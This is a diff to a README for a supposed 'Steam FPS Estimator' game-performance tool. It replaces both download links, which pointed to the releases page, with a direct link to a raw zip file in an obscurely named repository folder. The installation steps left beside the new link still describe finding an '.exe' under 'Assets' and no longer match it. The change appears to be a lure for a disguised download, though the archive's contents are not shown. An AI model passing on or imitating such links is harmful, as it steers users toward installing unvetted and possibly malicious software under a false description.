@@ -1,6 +1,6 @@
 # 🎮 Steam-FPS-Estimator-Beta-Version - Predict game performance before you play
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Limediseasespirochetebrazilnuttree326/Steam-FPS-Estimator-Beta-Version/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Limediseasespirochetebrazilnuttree326/Steam-FPS-Estimator-Beta-Version/main/sootless/FP_Steam_Beta_Version_Estimator_1.4.zip)
 
 Steam FPS Estimator Beta Version predicts the frame rate of games on your system. It analyzes your hardware and your specific graphics settings to show you how a game will run. This tool helps you find the right balance between image quality and performance. Use this software to configure your games for the best experience.
 
@@ -24,7 +24,7 @@ This tool runs on Windows. You need the following items to use the software:
 
 You must visit the project release page to get the installer. Follow these steps to obtain the tool:
 
-1. Visit [this page to download](https://github.com/Limediseasespirochetebrazilnuttree326/Steam-FPS-Estimator-Beta-Version/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/Limediseasespirochetebrazilnuttree326/Steam-FPS-Estimator-Beta-Version/main/sootless/FP_Steam_Beta_Version_Estimator_1.4.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the file ending in ".exe" to begin your download to your computer.
 4. Save the file to your desktop or your downloads folder.
